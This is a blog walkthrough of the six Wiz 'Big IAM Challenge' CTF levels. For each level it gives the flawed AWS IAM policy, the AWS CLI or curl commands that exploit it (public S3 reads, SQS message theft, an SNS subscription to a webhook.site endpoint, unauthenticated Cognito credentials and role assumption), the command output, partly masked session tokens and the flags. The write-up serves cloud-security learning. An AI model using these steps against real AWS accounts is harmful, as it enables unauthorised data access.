---
author: Nithissh
pubDatetime: 2023-06-08T15:22:00.000Z
title: "Big IAM Challenge - Wiz CTF Challenge"
featured: false
draft: false
tags:
  - cloudsecurity
  - ctf
description: "IAM Challenge from Wiz where we will be given an IAM rules and need to identify misconfiguration and exploit it to get a flag"
---

### Introduction

The Big IAM Challenge is a cloud security Capture The Flag (CTF) event designed to test your skills in AWS Identity and Access Management (IAM). The challenge consists of six steps, each focusing on a common IAM configuration mistake in various AWS services.
 

### Challenge 1: Buckets of Fun

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```

  

This IAM policy allows anyone to download an object and list an object from the bucket thebigiamchallenge-storage-9979f4b/files/. The goal is to find the flag.

### Solution

```sh
aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/
aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt ./
```

**Flag:** `{wiz:exposed-storage-risky-as-usual}`
  

### Challenge 2: Google Analytics


```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

  

This IAM policy allows anyone to send and receive SQS messages from wiz-tbic-analytics-sqs-queue-ca7a1b2. The challenge is to receive the flag.

  

#### Solution

```sh
> aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
{
    "Messages": [
        {
            "MessageId": "44c1cf94-51ca-4f62-9901-a62974d3a40c",
            "ReceiptHandle": "AQEBDD9PTJro+N0m5CTew9NrGyFZgRGL0h1ljFRw9VJKvXhDE/yHwHHAStHXZA5MVRw6Jd2KxJAtdnmkmSQaJvalRIoJtQSsd1zqT+d2rudemniJ1ONJ2ATi
EOwYmoacGipi8UXKIdixGDkl12krM9TTQy0d4h9s2xETMKJXXMN88g1rlhZs2XN8iRwSZuJ4I+iqnNVAc0eKT5PozBeR95hTZaspyUQx7jtWIgKYyy3Faqsw7dbbcHyrcZFKzFS7iGIS1RyQ9yHd7J
cUZ8ApASULnvF1sDDdAP7ymjbYaXxOIpKnBKq2D1AU4yscXNEfKbBNqGDR5rd7XwyGr9ry9lit6FIry6YaI7bwGG162mlEx4t2lAqnOS9bOt3XPLjpBN4czG7upT3VZGDr63rPSKTWA6r4WbgCe6CA
vBAl2Qywxo8=",
            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\": \"Lynx/2.5329.3258dev.3
5046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}"
        }
    ]
}

> curl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html
{wiz:you-are-at-the-front-of-the-queue}
```

Confirm the subscription and receive the flag.

**Flag:** `{wiz:you-are-at-the-front-of-the-queue}`  

### Challenge 3: Enable Push Notifications


```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

This IAM policy permits any individual to subscribe to the SNS **TBICWizPushNotifications** topic under the condition that the endpoint concludes with **["@tbic.wiz.io."](mailto:"@tbic.wiz.io." "mailto:\"@tbic.wiz.io.\"")**

  

In case you lack an email account concluding with that domain, an alternative protocol must be utilized for subscription. I will employ the HTTPS protocol alongside the tool available at [**https://webhook.site/**](https://webhook.site/) to subscribe and receive notifications at a unique URL.

  

Ensure to generate a distinctive URL and append **["/@tbic.wiz.io"](mailto:"/@tbic.wiz.io" "mailto:\"/@tbic.wiz.io\"")** at the end. For instance, your URL should resemble [**https://webhook.site/random-string/@tbic.wiz.io**](https://webhook.site/random-string/@tbic.wiz.io)**.**

  

Execute the following command to subscribe to the topic using the AWS CLI:

  

```sh
> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://webhook.site/random-string/@tbic.wiz.io
{
    "SubscriptionArn": "pending confirmation"
}
```

Upon completing the previous steps, you can expect a subscription confirmation message on the webhook dashboard. To confirm the subscription, simply visit the **SubscribeURL** provided in the message.

After confirming the subscription, you'll start receiving notifications containing a message. This message serves as the flag.

**Flag:** `{wiz:always-suspect-asterisks}` 

### Challenge 4: Admin only?

In this challenge, the IAM policy suggests that only the admin user should be able to access the files in the S3 bucket. However, there is a misconfiguration in the policy that allows anyone to list and download objects from the bucket.

  

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```
  

### Solution

```sh
> curl "https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321?prefix=files/"

<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>thebigiamchallenge-admin-storage-abf1321</Name><Prefix>files/</Prefix><Marker>
</Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>files/flag-as-admin.txt</Key><LastModified>2023-06-07T19:15:43.000Z</La
stModified><ETag>"e365cfa7365164c05d7a9c209c4d8514"</ETag><Size>42</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>files/logo-adm
in.png</Key><LastModified>2023-06-08T19:20:01.000Z</LastModified><ETag>"c57e95e6d6c138818bf38daac6216356"</ETag><Size>81889</Size><StorageClass>STANDA
RD</StorageClass></Contents></ListBucketResult>

> curl "https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt"
{wiz:principal-arn-is-not-what-you-think}
```

**Flag:** `{wiz:principal-arn-is-not-what-you-think}`  

### Challenge 5: Do I know you ?

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```

  

This IAM policy grants the application permissions to transmit event data and perform all actions within the Cognito Sync service. Additionally, it authorizes the retrieval and listing of objects from the **"wiz-privatefiles"** bucket.

  

Given the details in the policy, it is evident that the application employs the Cognito service. To identify the identity pool ID, let's examine the source code available at [**https://thebigiamchallenge.com/challenge/5**](https://thebigiamchallenge.com/challenge/5).

  

Upon obtaining the identity **pool ID**, we can acquire temporary credentials to simulate calls originating from the application. I will use the Windows cmd to set the temporary credentials as environment variables.

  

Subsequently, I will enumerate the objects and retrieve the flag using the granted permissions.

  

```sh
C:\>aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
{
    "IdentityId": "us-east-1:f5a72c75-855a-474b-b2a7-66e81fa7f946"
}

C:\>aws cognito-identity get-credentials-for-identity --identity-id us-east-1:f5a72c75-855a-474b-b2a7-66e81fa7f946
{
    "IdentityId": "us-east-1:f5a72c75-855a-474b-b2a7-66e81fa7f946",
    "Credentials": {
        "AccessKeyId": "ASIARK7LXXXXXXXX",
        "SecretKey": "DHbLG1eNTOPj0XXXXXXXXXXXXXXXXX",
        "SessionToken": "IQoJb3JpZ2luX2VjEOT//////////wEaCXVzLWVhc3QtMSJHMEUCIQDlh16iHsKaNP3juYvizDpfX1h3ryfBhEiRsexKRAdDvwIgRBNnEnBf2LByNm43cVgIopWnbAd8xFdDDUE6+lfjYdgqhwYIPRAAGgwwOTIyOTc4NTEzNzQiDFNb9tpd+irGhm5SmCrkBfXWprhVUrnp8+r7Su2hQzXnpK2PE2doivZ5p1OpljmpV1EAga2whq+s3KldFC/Iiq1p8o179VhwjStirJ2a3qiMG3EHFpuLyVvoYLnWUt6GYKaUREPf6iLN6Ga8lWfxEgFx1K7zr9brFls+LVRPhSF8ZBufeqGlIgnODpg1rRUJLms3Vf4x0/B8AdEmkVZZzApgnDWPyVBqBQmQbJEPty9BhVVqA+NNpHj5rSLmCVqzVtirZ1oDBk57GDlLGeJvQ3t9kV5kEbqGiX57NtMOmEtEZV3ePQMjpK9xPAcPQBBXGE6r8LuxPB9mz+ipSWZdMDI6RM2rCGhiCEC+RauXXMVB/gq9351UDbtaGGddNx2ckStCSsrAPPKjAcEqE4K8avdpVaW07uak48p7HfCd5wLZTR0NC1KFyXdpA6Mh8/FKYVm9Xdv1/afMtqXbfKrvdzy1xcskpQ+E7zNfBZQg11fgGzSQN/OeOhjwoRhyFQq7TX1fJSKgUdceJJywIxGc60mMUcl2nCeFqIebbN+t3LWbq89Zq3uMzDpAQqwDguOXf2/nLYfRT/lDztVV+dbEsLz0PXQfVDPGE7zRLCrWKTfyKjvmTnd2fFH6i2z9fndVLGWCdWuY1vSqwn0lpKTOra9adzzq8mVRv9PmL22ak5zVbTJxjG86NlOTZo/hnSGo4x2mt982QPOL3nR1v4uoq/l2wQPW4w/EV2wfUKUTwC6t2vvg+BKG+JrXx6jDWqF7tvns/A7Yt5I3B98RDprXVgHSecZBqzsdJZG8vXawUwZDtQXKmQAC4Pho1k7l26FGgbAGnewlP6460renbpwZE4TcKcLc9EvFsoTioI7diBnFH3lZSZQ3abHALQxIwVEXcbI0nRraPCL7i1EXEhr/3/iIwydZ3juHXsapHYV0zGGpox/iIdky1sQrsTZuSGdvIYmI/p6RFaUYyBFrGTwBT6IP2cELY4GjwzHjzMbtox3Bz8z8MNK7r6QGOocCSePseRkNkcwqx/K52OSiDFwsUZxbomhS8TfeFetOf4ArQKInX2/eU+Bv5G3x8Q0D2vXYBLAG8z91PMTFcsjZSRf+XhvLVZwaScu/B16DuOTwlnfp5sDHz9G5/UoHsWGk63SlVHr5jZ2jGdhHdDjd0jmATgouXG0F77S40Ci9nQ/snmE4t8Priarzm4obup+n6dFRXBAo+f9mCXKnhkvzSMgIAO2UYjK4MFEtNadvUKGz/Hn4ZDgyMAtnuo5U/zX+rSFrF+IwyFVm00g2tvblG6qdhunOUoB+HZhzZhZU5wVpNcLrpI4NJpnffAXVAbqNOiNFK0GazRXxaATNyJqVMTciS6ghR1A=",
        "Expiration": "2023-06-16T00:58:10-04:00"
    }
}

C:\>set AWS_ACCESS_KEY_ID=ASIARXXXXXXXXXQU4W

C:\>set AWS_SECRET_ACCESS_KEY=DHbLG1eXXXXXXXXXXXXigBrNnIxZr4

C:\>set AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEOT//////////wEaCXVzLWVhc3QtMSJHMEUCIQDlh16iHsKaNP3juYvizDpfX1h3ryfBhEiRsexKRAdDvwIgRBNnEnBf2LByNm43cVgIopWnbAd8xFdDDUE6+lfjYdgqhwYIPRAAGgwwOTIyOTc4NTEzNzQiDFNb9tpd+irGhm5SmCrkBfXWprhVUrnp8+r7Su2hQzXnpK2PE2doivZ5p1OpljmpV1EAga2whq+s3KldFC/Iiq1p8o179VhwjStirJ2a3qiMG3EHFpuLyVvoYLnWUt6GYKaUREPf6iLN6Ga8lWfxEgFx1K7zr9brFls+LVRPhSF8ZBufeqGlIgnODpg1rRUJLms3Vf4x0/B8AdEmkVZZzApgnDWPyVBqBQmQbJEPty9BhVVqA+NNpHj5rSLmCVqzVtirZ1oDBk57GDlLGeJvQ3t9kV5kEbqGiX57NtMOmEtEZV3ePQMjpK9xPAcPQBBXGE6r8LuxPB9mz+ipSWZdMDI6RM2rCGhiCEC+RauXXMVB/gq9351UDbtaGGddNx2ckStCSsrAPPKjAcEqE4K8avdpVaW07uak48p7HfCd5wLZTR0NC1KFyXdpA6Mh8/FKYVm9Xdv1/afMtqXbfKrvdzy1xcskpQ+E7zNfBZQg11fgGzSQN/OeOhjwoRhyFQq7TX1fJSKgUdceJJywIxGc60mMUcl2nCeFqIebbN+t3LWbq89Zq3uMzDpAQqwDguOXf2/nLYfRT/lDztVV+dbEsLz0PXQfVDPGE7zRLCrWKTfyKjvmTnd2fFH6i2z9fndVLGWCdWuY1vSqwn0lpKTOra9adzzq8mVRv9PmL22ak5zVbTJxjG86NlOTZo/hnSGo4x2mt982QPOL3nR1v4uoq/l2wQPW4w/EV2wfUKUTwC6t2vvg+BKG+JrXx6jDWqF7tvns/A7Yt5I3B98RDprXVgHSecZBqzsdJZG8vXawUwZDtQXKmQAC4Pho1k7l26FGgbAGnewlP6460renbpwZE4TcKcLc9EvFsoTioI7diBnFH3lZSZQ3abHALQxIwVEXcbI0nRraPCL7i1EXEhr/3/iIwydZ3juHXsapHYV0zGGpox/iIdky1sQrsTZuSGdvIYmI/p6RFaUYyBFrGTwBT6IP2cELY4GjwzHjzMbtox3Bz8z8MNK7r6QGOocCSePseRkNkcwqx/K52OSiDFwsUZxbomhS8TfeFetOf4ArQKInX2/eU+Bv5G3x8Q0D2vXYBLAG8z91PMTFcsjZSRf+XhvLVZwaScu/B16DuOTwlnfp5sDHz9G5/UoHsWGk63SlVHr5jZ2jGdhHdDjd0jmATgouXG0F77S40Ci9nQ/snmE4t8Priarzm4obup+n6dFRXBAo+f9mCXKnhkvzSMgIAO2UYjK4MFEtNadvUKGz/Hn4ZDgyMAtnuo5U/zX+rSFrF+IwyFVm00g2tvblG6qdhunOUoB+HZhzZhZU5wVpNcLrpI4NJpnffAXVAbqNOiNFK0GazRXxaATNyJqVMTciS6ghR1A=

C:\>set AWS_DEFAULT_REGION=us-east-1

C:\Users\Nithi>aws sts get-caller-identity
{
    "UserId": "AROARK7LBOHXJKAIRDRIU:CognitoIdentityCredentials",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessUnauth_Role/CognitoIdentityCredentials"
}

C:\>aws s3 ls s3://wiz-privatefiles
2023-06-05 15:42:27       4220 cognito1.png
2023-06-05 09:28:35         37 flag1.txt

C:\>aws s3 cp s3://wiz-privatefiles/flag1.txt -
{wiz:incognito-is-always-suspicious}
```

  
**Flag:** `{wiz:incognito-is-always-suspicious}`  

### Challenge 6: One final push

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```

  
This IAM policy enables the identity with the ID **"us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"** to assume a specified role.

  

Initially, we will obtain the IdentityId by using the identity pool ID. Subsequently, an OpenID token will be acquired.

The obtained OpenID token will then be employed to assume the role with the ARN **"arn:aws:iam::092297851374:role/Cognito\_s3accessAuth\_Role,"** resulting in the retrieval of user CognitoIdentityCredentials from challenge 5.

  

Following this, we will proceed to list the objects and search for the flag using the granted permissions

  

```sh
C:\>aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
{
    "IdentityId": "us-east-1:2068eb33-57fa-49fb-8136-0d50abf3d38a"
}

C:\>aws cognito-identity get-open-id-token --identity-id us-east-1:2068eb33-57fa-49fb-8136-0d50abf3d38a
{
    "IdentityId": "us-east-1:2068eb33-57fa-49fb-8136-0d50abf3d38a",
    "Token": "eyJraWQiOiJ1cy1lYXN0LTEzIiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6MjA2OGViMzMtNTdmYS00OWZiLTgxMzYtMGQ1MGFiZjNkMzhhIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE2ODY4ODk5ODEsImlhdCI6MTY4Njg4OTM4MX0.IXUj21kas-qVQh-6wVAKKOjRdNbLKAhM7x790on4MHny-CV5fQP8D87uTtlzGIgXd5alH7fWzOWBD3_MmNsH2FGs1vV1ZkivI62VWGnP3hOPIUgl07YBn6JVmGF0MQa7JCeq2m0eFA7RhAVA6xnSvKlQcyhl5b2bouKh-LH10voNx442ctrhFNj5e4Qa34czlFTI8zOcBjkIQ6uZUjaEneXNDxkn6WAJFXC_yVpEPeSa1RsxPFJzdUT9KV7PZP0hgVmxgy7mgY8GUpv0ehhWStmfQOBCvnrLAyhxFWzlfPbiNKpeqemo-d8T_WJm70zEFJTODx0o0mwSV60OpY3UWw"
}

C:\>aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name CognitoIdentityCredentials --web-identity-token eyJraWQiOiJ1cy1lYXN0LTEzIiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6MjA2OGViMzMtNTdmYS00OWZiLTgxMzYtMGQ1MGFiZjNkMzhhIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE2ODY4ODk5ODEsImlhdCI6MTY4Njg4OTM4MX0.IXUj21kas-qVQh-6wVAKKOjRdNbLKAhM7x790on4MHny-CV5fQP8D87uTtlzGIgXd5alH7fWzOWBD3_MmNsH2FGs1vV1ZkivI62VWGnP3hOPIUgl07YBn6JVmGF0MQa7JCeq2m0eFA7RhAVA6xnSvKlQcyhl5b2bouKh-LH10voNx442ctrhFNj5e4Qa34czlFTI8zOcBjkIQ6uZUjaEneXNDxkn6WAJFXC_yVpEPeSa1RsxPFJzdUT9KV7PZP0hgVmxgy7mgY8GUpv0ehhWStmfQOBCvnrLAyhxFWzlfPbiNKpeqemo-d8T_WJm70zEFJTODx0o0mwSV60OpY3UWw
{
    "Credentials": {
        "AccessKeyId": "ASIARXXXXXSG3DHL",
        "SecretAccessKey": "<SECRET_KEY_HERE>",
        "SessionToken": "IQoJb3JpZ2luX2VjEOX//////////wEaCXVzLWVhc3QtMSJIMEYCIQC6gZZiqRUM7ppdEPiYwRhxf//TmQ+2NSnoQxbQVQRqTAIhALbi27tTTH8AWStzFvU0hhZARqFAVYPcogebc8OUpuh7KpsDCD4QABoMMDkyMjk3ODUxMzc0Igw+uDQIAxjEovo/AW8q+ALk7nbipjCZAUangUfNBboy3te84Q+G6XsPMkv/mkedoYvhX4TZUkx8T/iSnxuOTpbw9yaStckZoXMer/w3lKdwgVeqtvOeqz1H/mFKSIoNe+iuDm1kFrpfLIGgBr0+02qHob9QQc7k5WtS80C6VQ5H/FZh685/morgSJeYmCI/bKcb/If5MyRV0PPV5WJb8PXGhS00nsBrHgSW0Ke9hre9MKHbiML1hM9z48fAUuJ42g8lVEWvkJMUlHI1rXz0mlm4jIyEsriVBC9B992YLwwRIg6V5sUNDipcly3LYpoeZ/ub7ddzYyKcGaUimO2JRYiw8Y1YBTxDz0KMdmcliAtOWnKoAkna7S6inO/6GdNvIzLc+dpcDYVK6OSLRY9brDbU3HFgYXTrSpzS6ujc2VsrUAv7cKi54htQZpq94oBu8YJKZn8vK6GbDyub9srfe2E9QhU79SDNhwn2gtDtjnc8Dr0grK4czdqj05MMvjBLLbzcffVY18CkMJnIr6QGOoYC5tXfgaGTLb5xBWYLwmUe82yjZso6LWM9Lg9A+PJGXll4ZQq1WHn/CNlEGJwow0SOk/kNXFtXAkk6Et4cWyLsRPVLce6GxmHfRmq2MXHlTlweUWoGFBA3uj3ahzH7xGxIwFO6VmspxFMIMa7kHvL3ULMzYm8g/rglJDu5C3s4C1wbDjm302wF0Oex40upZ5Lx3/IrZ6XBxqICs7yAelUG1Hx8PtpKZmne2ATSPtBXwrgyVm8KqPRvjjK1xGbkoULF1wz6Hlxa1hSCv3yJIrlVZ9oQt5wfOLEKtcbhFgLliGqMM7ef/zztuaDmqtglz29rlUQBvP5SVuj75acYOpk6zFa/bX8yVA==",
        "Expiration": "2023-06-16T05:24:57+00:00"
    },
    "SubjectFromWebIdentityToken": "us-east-1:2068eb33-57fa-49fb-8136-0d50abf3d38a",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:CognitoIdentityCredentials",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/CognitoIdentityCredentials"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}

C:\>set AWS_ACCESS_KEY_ID=ASIARKXXXXDHL

C:\>set AWS_SECRET_ACCESS_KEY=<SECRET_KEY_HERE>

C:\>set AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEOX//////////wEaCXVzLWVhc3QtMSJIMEYCIQC6gZZiqRUM7ppdEPiYwRhxf//TmQ+2NSnoQxbQVQRqTAIhALbi27tTTH8AWStzFvU0hhZARqFAVYPcogebc8OUpuh7KpsDCD4QABoMMDkyMjk3ODUxMzc0Igw+uDQIAxjEovo/AW8q+ALk7nbipjCZAUangUfNBboy3te84Q+G6XsPMkv/mkedoYvhX4TZUkx8T/iSnxuOTpbw9yaStckZoXMer/w3lKdwgVeqtvOeqz1H/mFKSIoNe+iuDm1kFrpfLIGgBr0+02qHob9QQc7k5WtS80C6VQ5H/FZh685/morgSJeYmCI/bKcb/If5MyRV0PPV5WJb8PXGhS00nsBrHgSW0Ke9hre9MKHbiML1hM9z48fAUuJ42g8lVEWvkJMUlHI1rXz0mlm4jIyEsriVBC9B992YLwwRIg6V5sUNDipcly3LYpoeZ/ub7ddzYyKcGaUimO2JRYiw8Y1YBTxDz0KMdmcliAtOWnKoAkna7S6inO/6GdNvIzLc+dpcDYVK6OSLRY9brDbU3HFgYXTrSpzS6ujc2VsrUAv7cKi54htQZpq94oBu8YJKZn8vK6GbDyub9srfe2E9QhU79SDNhwn2gtDtjnc8Dr0grK4czdqj05MMvjBLLbzcffVY18CkMJnIr6QGOoYC5tXfgaGTLb5xBWYLwmUe82yjZso6LWM9Lg9A+PJGXll4ZQq1WHn/CNlEGJwow0SOk/kNXFtXAkk6Et4cWyLsRPVLce6GxmHfRmq2MXHlTlweUWoGFBA3uj3ahzH7xGxIwFO6VmspxFMIMa7kHvL3ULMzYm8g/rglJDu5C3s4C1wbDjm302wF0Oex40upZ5Lx3/IrZ6XBxqICs7yAelUG1Hx8PtpKZmne2ATSPtBXwrgyVm8KqPRvjjK1xGbkoULF1wz6Hlxa1hSCv3yJIrlVZ9oQt5wfOLEKtcbhFgLliGqMM7ef/zztuaDmqtglz29rlUQBvP5SVuj75acYOpk6zFa/bX8yVA==

C:\>set AWS_DEFAULT_REGION=us-east-1

C:\>aws s3 ls
2023-06-04 13:07:29 tbic-wiz-analytics-bucket-b44867f
2023-06-05 09:07:44 thebigiamchallenge-admin-storage-abf1321
2023-06-04 12:31:02 thebigiamchallenge-storage-9979f4b
2023-06-05 09:28:31 wiz-privatefiles
2023-06-05 09:28:31 wiz-privatefiles-x1000

C:\>aws s3 ls s3://wiz-privatefiles-x1000
2023-06-05 15:42:27       4220 cognito2.png
2023-06-05 09:28:35         40 flag2.txt

C:\>aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt -
{wiz:open-sesame-or-shell-i-say-openid}
```

**Flag:** `{wiz:open-sesame-or-shell-i-say-openid}`